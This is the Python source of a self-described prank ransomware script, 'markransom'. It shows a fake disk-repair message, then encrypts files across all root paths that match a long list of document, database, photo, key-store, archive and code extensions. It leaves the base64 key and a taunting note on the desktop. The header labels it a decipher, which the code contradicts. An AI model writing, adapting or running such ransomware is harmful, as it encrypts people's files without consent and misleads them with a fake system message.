#!/usr/bin/env python
# -*- coding: utf-8 -*-
# markransom.py - decipher
# https://www.github.com/R3nt0n/markransom


__author__ = "r3nt0n"
__license__ = "GPL 3.0"
__version__ = "1.0.0"
__email__ = "r3nt0n@protonmail.com"
__status__ = "Development"


import os, subprocess, platform
from time import time
from base64 import b64encode
from random import randint

from Crypto.Random import get_random_bytes  # To generate random key

from lib.cryptor import find_root_paths, find_files_and_do


################################################################################
# CUSTOM SETTINGS
################################################################################
# This is just an example. You can set this variables to configure the script
# https://github.com/r3nt0n/markransom
# Name to show in the desktop message as author
JOKER = 'r3nt0n'
# Extensions to encrypted files
CUSTOM_EXT = '.r3nt0n.crypted'
# File names to desktop message and decryption key. Set False to don't create it
MSG_FILE = 'regrets.txt'
KEY_FILE = 'key'
# Message to write in the desktop file
MSG = '\nThe key-file is on your desktop. {} just kidding you.\nFind decipher and instructions at https://github.com/r3nt0n/markransom.'.format(JOKER)
# Extensions to search and encrypt
#EXTENSIONS = ['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg']
EXTENSIONS = ['.wb2', '.psd', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt','.cer', '.der', '.pl', '.py', '.lua',
              '.css', '.js', '.asp', '.php', '.incpas', '.asm', '.hpp', '.h', '.cpp', '.c', '.7z', '.zip', '.rar',
              '.drf', '.blend', '.apj', '.3ds', '.dwg', '.sda', '.ps', '.pat', '.fxg', '.fhd', '.fh', '.dxb',
              '.drw', '.design', '.ddrw', '.ddoc', '.dcs', '.csl', '.csh', '.cpi', '.cgm', '.cdx', '.cdrw', '.cdr6',
              '.cdr5', '.cdr4', '.cdr3', '.cdr', '.awg', '.ait', '.ai', '.agd1', '.ycbcra', '.x3f', '.stx', '.st8',
              '.st7', '.st6', '.st5', '.st4', '.srw', '.srf', '.sr2', '.sd1', '.sd0', '.rwz', '.rwl', '.rw2', '.raw',
              '.raf', '.ra2', '.ptx', '.pef', '.pcd', '.orf', '.nwb', '.nrw', '.nop', '.nef', '.ndd', '.mrw', '.mos',
              '.mfw', '.mef', '.mdc', '.kdc', '.kc2', '.iiq', '.gry', '.grey', '.gray', '.fpx', '.fff', '.exf', '.erf',
              '.dng', '.dcr', '.dc2', '.crw', '.craw', '.cr2', '.cmt', '.cib', '.ce2', '.ce1', '.arw', '.3pr', '.3fr',
              '.mpg', '.jpeg', '.jpg', '.mdb', '.sqlitedb', '.sqlite3', '.sqlite', '.sql', '.sdf', '.sav', '.sas7bdat',
              '.s3db', '.rdb', '.psafe3', '.nyf', '.nx2', '.nx1', '.nsh', '.nsg', '.nsf', '.nsd', '.ns4', '.ns3', '.ns2',
              '.myd', '.kpdx', '.kdbx', '.idx', '.ibz', '.ibd', '.fdb', '.erbsql', '.db3', '.dbf', '.db-journal', '.db',
              '.cls', '.bdb', '.al', '.adb', '.backupdb', '.bik', '.backup', '.bak', '.bkp', '.moneywell', '.mmw',
              '.ibank', '.hbk', '.ffd', '.dgc', '.ddd', '.dac', '.cfp', '.cdf', '.bpw', '.bgt', '.acr', '.ac2', '.ab4',
              '.djvu', '.pdf', '.sxm', '.odf', '.std', '.sxd', '.otg', '.sti', '.sxi', '.otp', '.odg', '.odp', '.stc',
              '.sxc', '.ots', '.ods', '.sxg', '.stw', '.sxw', '.odm', '.oth', '.ott', '.odt', '.odb', '.csv', '.rtf',
              '.accdr', '.accdt', '.accde', '.accdb', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.potm', '.potx',
              '.pptm', '.pptx', '.pps', '.pot', '.ppt', '.xlw', '.xll', '.xlam', '.xla', '.xlsb', '.xltm', '.xltx',
              '.xlsm', '.xlsx', '.xlm', '.xlt', '.xls', '.xml', '.dotm', '.dotx', '.docm', '.docx', '.dot', '.doc', '.txt']

########################################################################################################################


def fake_checkdisk():
    print(u'{} has detected uncleared nodes'.format(platform.system()))
    print(u'Starting testdisk tool, please don\'t shutdown your computer')
    print(u'{} disk errors found. Trying to repair disk...'.format(randint(2, 5)))

def just_kidding(key_enc, msg):
    if not (MSG_FILE and MSG_FILE):
        return False
    desktop_path = ''
    if os.name == 'nt':
        desktop_path = os.path.expanduser('~/Desktop/')
    elif os.name == 'posix':
        desktop_path = subprocess.check_output(['xdg-user-dir', 'DESKTOP']).rstrip('\n')
    if KEY_FILE:
        # Writing key into a file on the desktop
        key_file = os.path.join(desktop_path, KEY_FILE)
        with open(key_file, 'wb+') as f_key:
            f_key.write(key_enc)
    if MSG_FILE:
        # Writing .txt message on the desktop
        msg_file = os.path.join(desktop_path, MSG_FILE)
        with open(msg_file, 'wb+') as f_msg:
            f_msg.write(msg)



################################################################################
# SCRIPT-WORKFLOW
################################################################################
def main():
    init_time = time()
    fake_checkdisk()
    root_paths = find_root_paths()
    key = get_random_bytes(32)  # Generating a random key
    # Encrypting the files
    files_crypted = find_files_and_do(root_paths, EXTENSIONS, key, action='encrypt',crypted_ext=CUSTOM_EXT)
    # Calculating encryption time, writing the final message and saving the key.
    end_time = time()
    execution_time = end_time - init_time
    msg = '{} files have been encrypted in {} seconds.{}'.format(str(len(files_crypted)), str(end_time), MSG)
    key_enc = b64encode(key)
    just_kidding(key_enc, msg)


if __name__ == '__main__':
    main()